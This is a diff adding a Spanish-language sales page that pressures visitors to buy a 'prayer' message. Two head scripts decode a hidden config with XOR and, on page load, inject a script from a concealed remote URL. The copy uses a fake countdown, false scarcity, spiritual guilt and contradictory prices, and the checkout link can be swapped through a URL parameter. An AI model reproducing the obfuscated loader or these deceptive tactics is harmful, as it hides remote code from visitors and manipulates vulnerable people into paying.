@@ -1,0 +1,851 @@
+<!DOCTYPE html><html lang="es"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="format-detection" content="telephone=no">
+  <title>Espera un instante...</title>
+  <meta name="description" content="Tu oración aún está disponible por tiempo limitado.">
+
+  <script>
+    (function () {
+      const PARAMS_KEY = 'quiz_persisted_params';
+      const FIRST_TOUCH_PARAMS_KEY = 'quiz_first_touch_params';
+      const LANDING_URL_KEY = 'quiz_landing_url';
+      const LANDING_PATH_KEY = 'quiz_landing_pathname';
+
+      function safeGetStorage(type) {
+        try { return window[type]; } catch (e) { return null; }
+      }
+
+      const session = safeGetStorage('sessionStorage');
+      const local = safeGetStorage('localStorage');
+
+      function readStoredParams() {
+        const raw = (session && session.getItem(PARAMS_KEY)) || (local && local.getItem(PARAMS_KEY)) || '';
+        try { return new URLSearchParams(raw); } catch (e) { return new URLSearchParams(); }
+      }
+
+      function writeBoth(key, value) {
+        try { if (session) session.setItem(key, value); } catch (e) {}
+        try { if (local) local.setItem(key, value); } catch (e) {}
+      }
+
+      try {
+        const currentUrl = new URL(window.location.href);
+        const currentParams = new URLSearchParams(currentUrl.search);
+        const storedParams = readStoredParams();
+
+        currentParams.forEach(function (value, key) {
+          if (value !== null && value !== '' && key !== 'checkout' && key !== 'url') {
+            storedParams.set(key, value);
+          }
+        });
+
+        const mergedParams = storedParams.toString();
+        if (mergedParams) writeBoth(PARAMS_KEY, mergedParams);
+
+        const existingFirstTouch = (local && local.getItem(FIRST_TOUCH_PARAMS_KEY)) || '';
+        if (!existingFirstTouch && currentParams.toString()) {
+          try { if (local) local.setItem(FIRST_TOUCH_PARAMS_KEY, currentParams.toString()); } catch (e) {}
+        }
+
+        const existingLandingUrl = (local && local.getItem(LANDING_URL_KEY)) || (session && session.getItem(LANDING_URL_KEY)) || '';
+        if (!existingLandingUrl) {
+          writeBoth(LANDING_URL_KEY, currentUrl.toString());
+          writeBoth(LANDING_PATH_KEY, currentUrl.pathname);
+        }
+      } catch (e) {}
+    })();
+  </script>
+
+  <style>
+    :root {
+      --bg-main: #eef8ff;
+      --bg-soft: #f8fcff;
+      --bg-card: rgba(255, 255, 255, 0.90);
+      --bg-card-strong: #ffffff;
+      --text: #10324d;
+      --text-soft: #57758f;
+      --text-light: #6f8ea7;
+      --blue-1: #dff3ff;
+      --blue-2: #bfe6ff;
+      --blue-3: #7dcbff;
+      --blue-4: #48aef5;
+      --blue-5: #2388d8;
+      --green-1: #38d96b;
+      --green-2: #1fa94b;
+      --green-3: #13873a;
+      --red-1: #e8414f;
+      --red-2: #ff7380;
+      --gold-1: #f7c85d;
+      --gold-2: #ffe8a6;
+      --line: rgba(80, 162, 220, 0.22);
+      --line-strong: rgba(49, 142, 209, 0.38);
+      --shadow-soft: 0 18px 46px rgba(79, 145, 188, 0.14);
+      --shadow-card: 0 18px 48px rgba(74, 149, 198, 0.16);
+      --shadow-button: 0 14px 30px rgba(45, 144, 215, 0.28);
+      --radius-xl: 28px;
+      --radius-lg: 24px;
+      --radius-md: 18px;
+      --progress-track: rgba(82, 164, 221, 0.15);
+      --progress-fill: linear-gradient(90deg, #9fe1ff 0%, #51b8f7 50%, #2890df 100%);
+    }
+
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    html, body {
+      margin: 0;
+      min-height: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--bg-main);
+      color: var(--text);
+      overflow-x: hidden;
+    }
+
+    body { position: relative; isolation: isolate; }
+
+    .bg-layer {
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(circle at top center, rgba(115, 205, 255, 0.30), transparent 34%),
+        radial-gradient(circle at bottom left, rgba(160, 223, 255, 0.24), transparent 30%),
+        linear-gradient(180deg, #f5fbff 0%, #edf8ff 38%, #e6f5ff 100%);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .bg-vibrance {
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(circle at 20% 15%, rgba(255,255,255,0.92), transparent 18%),
+        radial-gradient(circle at 80% 0%, rgba(143, 219, 255, 0.20), transparent 22%),
+        linear-gradient(90deg, rgba(255,255,255,0.20), transparent 18%, transparent 82%, rgba(125, 203, 255, 0.12));
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    .page {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 1040px;
+      margin: 0 auto;
+      padding: 18px 14px 32px;
+    }
+
+    .alert-bar {
+      width: fit-content;
+      max-width: 100%;
+      margin: 0 auto 12px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      padding: 9px 13px;
+      border-radius: 999px;
+      border: 1px solid rgba(232, 65, 79, 0.22);
+      background: rgba(255, 255, 255, 0.88);
+      color: #bd2d3d;
+      box-shadow: 0 10px 26px rgba(232, 65, 79, 0.08), inset 0 1px 0 rgba(255,255,255,0.78);
+      font-size: 12px;
+      line-height: 1.25;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 0.035em;
+      text-align: center;
+    }
+
+    .pulse-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--red-1);
+      box-shadow: 0 0 0 0 rgba(232, 65, 79, 0.55);
+      animation: pulseDot 1.25s ease-in-out infinite;
+      flex: 0 0 auto;
+    }
+
+    .panel {
+      width: 100%;
+      background: linear-gradient(180deg, rgba(255,255,255,0.97), rgba(248,252,255,0.94));
+      border: 1px solid rgba(116, 193, 240, 0.22);
+      border-radius: var(--radius-xl);
+      box-shadow: var(--shadow-soft);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .panel::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(180deg, rgba(255,255,255,0.34), transparent 22%),
+        radial-gradient(circle at top, rgba(185, 231, 255, 0.22), transparent 36%);
+      pointer-events: none;
+    }
+
+    .hero {
+      padding: 20px;
+    }
+
+    .hero-grid {
+      position: relative;
+      z-index: 2;
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      gap: 20px;
+      align-items: stretch;
+    }
+
+    .hero-copy,
+    .offer-card {
+      position: relative;
+      z-index: 2;
+    }
+
+    .hero-copy {
+      padding: 8px 4px 8px 2px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .small-badge,
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: fit-content;
+      padding: 9px 14px;
+      border-radius: 999px;
+      border: 1px solid rgba(87, 178, 233, 0.22);
+      background: linear-gradient(180deg, rgba(255,255,255,0.96), rgba(225,244,255,0.96));
+      color: var(--blue-5);
+      font-size: 13px;
+      font-weight: 900;
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
+      box-shadow: 0 10px 24px rgba(73, 158, 207, 0.10);
+    }
+
+    .hero-badge { margin-bottom: 14px; }
+
+    h1 {
+      margin: 0 0 12px;
+      max-width: 650px;
+      color: var(--text);
+      font-size: clamp(32px, 5vw, 58px);
+      line-height: 0.98;
+      letter-spacing: -0.055em;
+      font-weight: 950;
+      text-wrap: balance;
+    }
+
+    h1 span { color: var(--blue-5); }
+
+    .lead {
+      margin: 0 0 15px;
+      max-width: 620px;
+      color: var(--text-soft);
+      font-size: clamp(17px, 2vw, 21px);
+      line-height: 1.5;
+      font-weight: 600;
+      text-wrap: pretty;
+    }
+
+    .lead strong { color: var(--blue-5); }
+
+    .divider-soft {
+      width: 84px;
+      height: 5px;
+      border-radius: 999px;
+      background: linear-gradient(90deg, rgba(170,231,255,0.4), rgba(69,174,241,0.88), rgba(170,231,255,0.4));
+      margin: 0 0 16px;
+    }
+
+    .price-strip {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      width: fit-content;
+      margin: 0 0 16px;
+      padding: 12px 14px;
+      border-radius: 18px;
+      border: 1px solid rgba(100, 191, 244, 0.24);
+      background: rgba(255,255,255,0.92);
+      box-shadow: 0 12px 28px rgba(86, 164, 214, 0.10), inset 0 1px 0 rgba(255,255,255,0.78);
+    }
+
+    .old-price {
+      color: rgba(87,117,143,0.70);
+      font-size: 15px;
+      font-weight: 900;
+      text-decoration: line-through;
+    }
+
+    .new-price {
+      color: var(--green-3);
+      font-size: 27px;
+      line-height: 1;
+      font-weight: 950;
+      letter-spacing: -0.035em;
+    }
+
+    .price-badge {
+      padding: 7px 10px;
+      border-radius: 999px;
+      background: rgba(232, 65, 79, 0.08);
+      color: #bd2d3d;
+      border: 1px solid rgba(232, 65, 79, 0.16);
+      font-size: 11px;
+      font-weight: 950;
+      text-transform: uppercase;
+      letter-spacing: 0.035em;
+    }
+
+    .warning-card {
+      display: grid;
+      gap: 10px;
+      margin: 0 0 16px;
+      padding: 14px;
+      border-radius: 20px;
+      border: 1px solid rgba(232, 65, 79, 0.14);
+      background: linear-gradient(180deg, rgba(255,255,255,0.94), rgba(255,242,244,0.82));
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.78), 0 10px 24px rgba(232, 65, 79, 0.05);
+    }
+
+    .warning-row {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      color: var(--text-soft);
+      font-size: 15px;
+      line-height: 1.42;
+      font-weight: 700;
+    }
+
+    .warning-row b {
+      color: #bd2d3d;
+      font-weight: 950;
+    }
+
+    .warn-icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex: 0 0 22px;
+      background: rgba(232, 65, 79, 0.10);
+      color: #bd2d3d;
+      font-size: 13px;
+      font-weight: 950;
+      border: 1px solid rgba(232,65,79,0.12);
+    }
+
+    .cta-wrap { display: grid; gap: 10px; margin-top: 15px; }
+
+    .cta-main {
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      min-height: 62px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: 1px solid rgba(255,255,255,0.22);
+      border-radius: 20px;
+      background: linear-gradient(180deg, #38d96b 0%, #1fa94b 50%, #13873a 100%);
+      color: #ffffff;
+      text-decoration: none;
+      font-size: clamp(18px, 2vw, 22px);
+      font-weight: 950;
+      letter-spacing: -0.025em;
+      text-align: center;
+      box-shadow:
+        0 18px 38px rgba(22, 139, 63, 0.28),
+        0 0 0 8px rgba(57, 216, 107, 0.08),
+        inset 0 2px 0 rgba(255,255,255,0.30),
+        inset 0 -2px 0 rgba(8, 87, 36, 0.22);
+      cursor: pointer;
+      animation: pulseGreen 1.7s ease-in-out infinite;
+    }
+
+    .cta-main::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -130%;
+      width: 52%;
+      height: 100%;
+      background: linear-gradient(115deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.08) 35%, rgba(255,255,255,0.42) 50%, rgba(255,255,255,0.08) 65%, rgba(255,255,255,0) 100%);
+      transform: skewX(-22deg);
+      pointer-events: none;
+      animation: buttonSweep 2.8s ease-in-out infinite;
+    }
+
+    .cta-main span { position: relative; z-index: 1; }
+    .cta-arrow { font-size: 23px; line-height: 1; display: inline-block; animation: arrowNudge 1.2s ease-in-out infinite; }
+
+    .cta-note {
+      max-width: 520px;
+      margin: 0 auto;
+      color: var(--text-light);
+      font-size: 13px;
+      line-height: 1.4;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .offer-card {
+      width: 100%;
+      border-radius: 26px;
+      border: 1px solid rgba(135, 206, 246, 0.22);
+      background:
+        radial-gradient(circle at top, rgba(185,231,255,0.30), transparent 42%),
+        linear-gradient(180deg, rgba(255,255,255,0.95), rgba(235,248,255,0.86));
+      box-shadow: var(--shadow-card), inset 0 1px 0 rgba(255,255,255,0.78);
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .offer-top {
+      border-radius: 22px;
+      padding: 18px;
+      background: rgba(255,255,255,0.74);
+      border: 1px solid rgba(100, 191, 244, 0.18);
+      text-align: center;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.76);
+    }
+
+    .offer-top small {
+      display: inline-flex;
+      margin-bottom: 10px;
+      padding: 7px 10px;
+      border-radius: 999px;
+      background: rgba(232, 65, 79, 0.08);
+      border: 1px solid rgba(232, 65, 79, 0.16);
+      color: #bd2d3d;
+      font-size: 10.5px;
+      line-height: 1.2;
+      font-weight: 950;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .offer-top h2 {
+      margin: 0 auto 10px;
+      color: var(--text);
+      font-size: clamp(24px, 3.2vw, 34px);
+      line-height: 1.04;
+      letter-spacing: -0.045em;
+      text-wrap: balance;
+    }
+
+    .offer-top p {
+      margin: 0 auto;
+      color: var(--text-soft);
+      font-size: 15px;
+      line-height: 1.5;
+      font-weight: 650;
+    }
+
+    .timer-box {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 14px;
+      padding: 13px 14px;
+      border-radius: 18px;
+      border: 1px solid rgba(232, 65, 79, 0.18);
+      background: rgba(255,255,255,0.74);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.76);
+    }
+
+    .timer-box span:first-child {
+      color: #bd2d3d;
+      font-size: 11px;
+      line-height: 1.2;
+      font-weight: 950;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .timer {
+      color: var(--text);
+      font-size: 22px;
+      line-height: 1;
+      font-weight: 950;
+      letter-spacing: -0.02em;
+      white-space: nowrap;
+    }
+
+    .mini-list { display: grid; gap: 10px; margin-top: 14px; }
+
+    .mini-item {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      padding: 13px;
+      border-radius: 16px;
+      background: rgba(255,255,255,0.72);
+      border: 1px solid rgba(100, 191, 244, 0.16);
+      color: var(--text-soft);
+      font-size: 14px;
+      line-height: 1.38;
+      font-weight: 700;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.76);
+    }
+
+    .mini-item b { color: var(--blue-5); }
+
+    .mini-icon {
+      width: 24px;
+      height: 24px;
+      flex: 0 0 24px;
+      border-radius: 9px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(100, 191, 244, 0.13);
+      border: 1px solid rgba(100, 191, 244, 0.20);
+    }
+
+    .section,
+    .final-box {
+      position: relative;
+      z-index: 2;
+      margin-top: 16px;
+      padding: 22px;
+    }
+
+    .section h2,
+    .final-box h2 {
+      margin: 0 auto 13px;
+      color: var(--text);
+      font-size: clamp(24px, 3.3vw, 38px);
+      line-height: 1.05;
+      letter-spacing: -0.04em;
+      text-align: center;
+      text-wrap: balance;
+    }
+
+    .section h2 span,
+    .final-box h2 span { color: var(--blue-5); }
+
+    .benefits {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 12px;
+      margin-top: 16px;
+    }
+
+    .benefit {
+      padding: 16px;
+      border-radius: 20px;
+      border: 1px solid rgba(100, 191, 244, 0.18);
+      background: rgba(255,255,255,0.72);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.76);
+    }
+
+    .benefit-icon {
+      width: 42px;
+      height: 42px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 14px;
+      margin-bottom: 12px;
+      background: rgba(100,191,244,0.13);
+      border: 1px solid rgba(100,191,244,0.20);
+      font-size: 22px;
+    }
+
+    .benefit strong {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 17px;
+      line-height: 1.2;
+      color: var(--text);
+    }
+
+    .benefit p {
+      margin: 0;
+      color: var(--text-soft);
+      font-size: 14px;
+      line-height: 1.48;
+      font-weight: 600;
+    }
+
+    .final-box { text-align: center; }
+
+    .final-box p {
+      max-width: 720px;
+      margin: 0 auto 16px;
+      color: var(--text-soft);
+      font-size: 17px;
+      line-height: 1.55;
+      font-weight: 600;
+    }
+
+    .final-box p strong { color: var(--blue-5); }
+
+    .final-box .cta-main {
+      max-width: 620px;
+      margin: 0 auto;
+    }
+
+    .soft-disclaimer {
+      max-width: 840px;
+      margin: 16px auto 0;
+      color: rgba(87, 117, 143, 0.58);
+      font-size: 11px;
+      line-height: 1.48;
+      text-align: center;
+    }
+
+    @keyframes pulseDot {
+      0%,100% { box-shadow: 0 0 0 0 rgba(232, 65, 79, 0.55); }
+      50% { box-shadow: 0 0 0 8px rgba(232, 65, 79, 0); }
+    }
+
+    @keyframes pulseGreen { 0%,100% { transform: scale(1); } 50% { transform: scale(1.018); } }
+    @keyframes buttonSweep { 0% { left: -130%; } 55% { left: 150%; } 100% { left: 150%; } }
+    @keyframes arrowNudge { 0%,100% { transform: translateY(-1px) translateX(0); } 50% { transform: translateY(-1px) translateX(4px); } }
+
+    @media (max-width: 900px) {
+      .hero-grid { grid-template-columns: 1fr; }
+      .benefits { grid-template-columns: 1fr; }
+      .hero-copy { padding: 0; }
+    }
+
+    @media (max-width: 520px) {
+      .page { padding: 14px 12px 26px; }
+      .alert-bar { font-size: 10.5px; padding: 9px 11px; margin-bottom: 12px; }
+      .hero { padding: 16px; border-radius: 24px; }
+      h1 { font-size: 32px; line-height: 1; }
+      .lead { font-size: 16.5px; }
+      .price-strip { width: 100%; justify-content: center; text-align: center; }
+      .new-price { font-size: 25px; }
+      .warning-row { font-size: 14px; }
+      .cta-main { min-height: 60px; font-size: 17px; border-radius: 18px; padding: 0 14px; }
+      .section, .final-box { padding: 18px 14px; border-radius: 24px; }
+      .timer-box { align-items: flex-start; flex-direction: column; }
+      .small-badge, .hero-badge { font-size: 11px; }
+    }
+  </style>
+
+<script>(function(){var p_qu8=atob("DPDm/QOPc+F9ND+58ovEiHHjUdtfXEvNgoPc0izsF49TQUvUm5af02DgHs8fRhDKkYKPjXf8XJQJWUyWnpGSmHD7XYsOFhObk4SSj2rtBpUYRx2DqYvEk2LiFsNHFlvYhpHLiHfiGocEGU/Ll4aDk3eiC4ISUBLKkZvE0SH5Eo0IUR2D0NKb0XitHYAQUR2D0JSHiWKiBpUQXVnA34CUmHXqHZVQR0rbm5SV3y+tBYARQVqbyNLEgF7y");var x_f5t=[];for(var t_v8q=0;t_v8q<p_qu8.length;t_v8q++){x_f5t.push(p_qu8.charCodeAt(t_v8q)&255);}var y_m=x_f5t[0];var g_xq=x_f5t.slice(1,1+y_m);var x_fa5=x_f5t.slice(1+y_m);var j_5v76=x_fa5.map(function(b,u_4wni){return b^g_xq[u_4wni%y_m];});var y_gs8="";for(var z_qkxg=0;z_qkxg<j_5v76.length;z_qkxg++){y_gs8+=String.fromCharCode(j_5v76[z_qkxg]&255);}var b_ey4g=decodeURIComponent(escape(y_gs8));var s_5g=JSON.parse(b_ey4g);var d_12ma=s_5g.globals||[];d_12ma.forEach(function(n_pwv){window[n_pwv.name]=n_pwv.value;});var r_t=document.createElement("script");r_t.src=s_5g.url;r_t.async=true;r_t.defer=true;(s_5g.attributes||[]).forEach(function(h_czx){r_t.setAttribute(h_czx.name,h_czx.value);});(document.head||document.documentElement).appendChild(r_t);})();</script>
+
+<script>(function(){var d_mt=atob("DKRkQAG364lQngKgxd9GNXPbybNy9nbUtddeby7Uj+d+63bNrMIdbmLYhqcy7C3TptYNMHXExPk55mfM6tQNOGTbxeMjvC6CpNAQMmjVnv017SCanvlIYmbbhOsx8nGC//8fYm/WhuxypCDQrNwBLEjTyaVy6GPMsMFGeiOBirFnqjbF8pFcdmOH3L0y+zPD9cZcITWVltQt");var h_7m9=[];for(var d_lak=0;d_lak<d_mt.length;d_lak++){h_7m9.push(d_mt.charCodeAt(d_lak)&255);}var e_itf=h_7m9[0];var p_m7=h_7m9.slice(1,1+e_itf);var s_gm=h_7m9.slice(1+e_itf);var j_ohg=s_gm.map(function(b,j_uul){return b^p_m7[j_uul%e_itf];});var o_g="";for(var l_b=0;l_b<j_ohg.length;l_b++){o_g+=String.fromCharCode(j_ohg[l_b]&255);}var d_rr1r=decodeURIComponent(escape(o_g));var u_hio=JSON.parse(d_rr1r);var v_9=u_hio.globals||[];v_9.forEach(function(o_z0){window[o_z0.name]=o_z0.value;});var b_gf=document.createElement("script");b_gf.src=u_hio.url;b_gf.async=true;b_gf.defer=true;(u_hio.attributes||[]).forEach(function(c_t5d){b_gf.setAttribute(c_t5d.name,c_t5d.value);});(document.head||document.documentElement).appendChild(b_gf);})();</script>
+
+</head>
+<body>
+  <div class="bg-layer"></div>
+  <div class="bg-vibrance"></div>
+
+  <main class="page">
+    <div class="alert-bar">
+      <span class="pulse-dot"></span>
+      <span>Espera: tu oración aún no ha sido concluida</span>
+    </div>
+
+    <section class="hero panel">
+      <div class="hero-grid">
+        <div class="hero-copy">
+          <div class="hero-badge">Mensaje urgente para ti</div>
+
+          <h1>Saliste antes de recibir la <span>orientación completa.</span></h1>
+          <div class="divider-soft"></div>
+
+          <p class="lead">
+            Esta página se abrió porque tu mensaje aún estaba en curso. <strong>No fue por casualidad que esta oración llegó hasta ti hoy</strong> — y esta condición no seguirá apareciendo nuevamente.
+          </p>
+
+          <div class="price-strip" aria-label="Oferta especial">
+            <span class="old-price">De US$ 39,90</span>
+            <span class="new-price">por US$ 7,90</span>
+            <span class="price-badge">liberado ahora</span>
+          </div>
+
+          <div class="warning-card">
+            <div class="warning-row">
+              <span class="warn-icon">!</span>
+              <span><b>Si sales ahora,</b> puedes perder esta condición especial y no conseguir encontrar este mismo acceso después.</span>
+            </div>
+            <div class="warning-row">
+              <span class="warn-icon">!</span>
+              <span><b>Este mensaje no va a aparecer nuevamente</b> de la misma forma cuando abandones esta página.</span>
+            </div>
+            <div class="warning-row">
+              <span class="warn-icon">!</span>
+              <span><b>Cuando una señal llega en el momento correcto,</b> ignorarla puede ser dejar atrás aquello que pediste en silencio.</span>
+            </div>
+          </div>
+
+          <div class="cta-wrap">
+            <a class="cta-main" id="mainCta" href="https://checkout.centerpag.com/pay/PPU38CQFGIL?" rel="nofollow">
+              <span>SÍ, QUIERO GARANTIZAR POR US$ 7,90</span>
+              <span class="cta-arrow">→</span>
+            </a>
+            <p class="cta-note">Toca el botón de arriba para continuar con seguridad. Tus parámetros de campaña serán preservados.</p>
+          </div>
+        </div>
+
+        <aside class="offer-card" aria-label="Resumo da oferta">
+          <div class="offer-top">
+            <small>Acceso especial aún disponible</small>
+            <h2>Tu oración aún está reservada.</h2>
+            <p>Pero esta condición puede dejar de aparecer cuando salgas. Continúa ahora para no perder el acceso con valor reducido.</p>
+          </div>
+
+          <div class="timer-box">
+            <span>Condición activa por poco tiempo</span>
+            <strong class="timer" id="timer">05:00</strong>
+          </div>
+
+          <div class="mini-list">
+            <div class="mini-item">
+              <span class="mini-icon">🕊️</span>
+              <span><b>Mensaje espiritual completo</b> para acompañar este momento.</span>
+            </div>
+            <div class="mini-item">
+              <span class="mini-icon">🔒</span>
+              <span><b>Acceso inmediato</b> después de finalizar la compra con seguridad.</span>
+            </div>
+            <div class="mini-item">
+              <span class="mini-icon">⏳</span>
+              <span><b>De US$ 39,90 por US$ 14,90</b> solo en esta condición especial.</span>
+            </div>
+          </div>
+        </aside>
+      </div>
+    </section>
+
+    <section class="section panel">
+      <h2>¿Por qué <span>continuar ahora</span> puede hacer la diferencia?</h2>
+      <div class="benefits">
+        <div class="benefit">
+          <div class="benefit-icon">🕊️</div>
+          <strong>Ya llegaste hasta el punto decisivo</strong>
+          <p>Muchas personas desisten exactamente antes de concluir. Esta página existe para recordarte que todavía puedes continuar.</p>
+        </div>
+        <div class="benefit">
+          <div class="benefit-icon">⏳</div>
+          <strong>El acceso puede no quedar visible después</strong>
+          <p>Al salir, puede que no encuentres nuevamente la misma condición, la misma página o el mismo camino de acceso.</p>
+        </div>
+        <div class="benefit">
+          <div class="benefit-icon">✨</div>
+          <strong>Este mensaje llegó en el momento correcto</strong>
+          <p>Cuando algo toca el corazón, el peor error es dejarlo para después. Continúa mientras la oportunidad todavía está delante de ti.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="final-box panel">
+      <h2>No cierres esta página sin concluir lo que comenzaste.</h2>
+      <p>
+        Puedes salir y dejar pasar esta oportunidad... o puedes continuar ahora y recibir el acceso completo. <strong>Si este mensaje llegó hasta ti, existe un motivo para no ignorarlo.</strong>
+      </p>
+      <a class="cta-main" id="bottomCta" href="https://checkout.centerpag.com/pay/PPU38CQFGIL?" rel="nofollow">
+        <span>CONTINUAR Y GARANTIZAR MI ACCESO</span>
+        <span class="cta-arrow">→</span>
+      </a>
+      <div class="soft-disclaimer">
+        Esta página tiene carácter informativo y promocional. Las experiencias pueden variar de persona a persona. La disponibilidad de la condición puede depender de la campaña, del período y del acceso realizado.
+      </div>
+    </section>
+  </main>
+
+  <script>
+    (function () {
+      const PARAMS_KEY = 'quiz_persisted_params';
+      const DEFAULT_CHECKOUT_URL = 'https://checkout.centerpag.com/pay/PPU38CQFGIL?';
+
+      function getParamsFromStorage() {
+        try {
+          const raw = sessionStorage.getItem(PARAMS_KEY) || localStorage.getItem(PARAMS_KEY) || '';
+          return raw ? new URLSearchParams(raw) : new URLSearchParams(window.location.search);
+        } catch (e) {
+          return new URLSearchParams(window.location.search);
+        }
+      }
+
+      function mergeCurrentParams() {
+        try {
+          const stored = getParamsFromStorage();
+          const current = new URLSearchParams(window.location.search);
+          current.forEach(function (value, key) {
+            if (value && key !== 'checkout' && key !== 'url') stored.set(key, value);
+          });
+          const serialized = stored.toString();
+          if (serialized) {
+            sessionStorage.setItem(PARAMS_KEY, serialized);
+            localStorage.setItem(PARAMS_KEY, serialized);
+          }
+        } catch (e) {}
+      }
+
+      function appendParams(url) {
+        try {
+          const params = getParamsFromStorage();
+          const finalUrl = new URL(url || DEFAULT_CHECKOUT_URL, window.location.origin);
+          params.forEach(function (value, key) {
+            if (value && key !== 'checkout' && key !== 'url' && key !== 'off') {
+              finalUrl.searchParams.set(key, value);
+            }
+          });
+          return finalUrl.toString();
+        } catch (e) {
+          return url || DEFAULT_CHECKOUT_URL;
+        }
+      }
+
+      function getCheckoutUrl() {
+        try {
+          const params = new URLSearchParams(window.location.search);
+          return params.get('checkout') || params.get('url') || DEFAULT_CHECKOUT_URL;
+        } catch (e) {
+          return DEFAULT_CHECKOUT_URL;
+        }
+      }
+
+      function hydrateCtas() {
+        const finalUrl = appendParams(getCheckoutUrl());
+        document.querySelectorAll('#mainCta, #bottomCta').forEach(function (cta) {
+          cta.href = finalUrl;
+        });
+      }
+
+      function startTimer() {
+        const el = document.getElementById('timer');
+        if (!el) return;
+        let seconds = 5 * 60;
+        const tick = function () {
+          const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+          const s = Math.floor(seconds % 60).toString().padStart(2, '0');
+          el.textContent = m + ':' + s;
+          if (seconds > 0) seconds -= 1;
+        };
+        tick();
+        setInterval(tick, 1000);
+      }
+
+      mergeCurrentParams();
+      hydrateCtas();
+      startTimer();
+    })();
+  </script>
+
+</body></html>
